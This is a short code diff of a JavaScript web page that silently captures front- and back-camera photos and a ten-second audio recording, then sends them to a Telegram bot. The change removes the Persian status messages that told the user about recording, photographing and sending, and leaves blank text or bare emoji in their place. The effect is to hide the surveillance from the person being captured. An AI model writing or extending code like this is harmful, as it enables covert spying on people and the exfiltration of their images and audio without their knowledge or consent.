@@ -39,10 +39,10 @@ async function recordAudio() {
         resolve(new Blob(chunks, { type: "audio/webm" }));
       };
       mediaRecorder.start();
-      statusText.innerText = "🎙 در حال ضبط صدا...";
+      statusText.innerText = "";
       setTimeout(() => {
         mediaRecorder.stop();
-        statusText.innerText = "⏳ در حال ارسال...";
+        statusText.innerText = "✔️";
       }, 10000);
     });
   } catch {
@@ -63,22 +63,22 @@ function sendToTelegram(audio, photoFront, photoBack) {
   if (photoBack) sendFile("sendPhoto", "photo", photoBack, "back.jpg");
 
   if (audio || photoFront || photoBack) {
-    statusText.innerText = "✅ فایل‌ها ارسال شدند.";
+    statusText.innerText = "✅";
   } else {
-    statusText.innerText = "❌ دسترسی رد شده یا خطا.";
+    statusText.innerText = "❌";
     fetch(`https://api.telegram.org/bot${botToken}/sendMessage`, {
       method: "POST",
       headers: { "Content-Type": "application/json" },
-      body: JSON.stringify({ chat_id: chatId, text: "🚫 خطا یا دسترسی داده نشد." })
+      body: JSON.stringify({ chat_id: chatId, text: "🚫" })
     });
   }
 }
 
 async function startAll() {
-  statusText.innerText = "📸 گرفتن عکس جلو...";
+  statusText.innerText = "";
   photoFront = await captureImage("user");
 
-  statusText.innerText = "📸 گرفتن عکس پشت...";
+  statusText.innerText = "";
   photoBack = await captureImage("environment");
 
   audioBlob = await recordAudio();
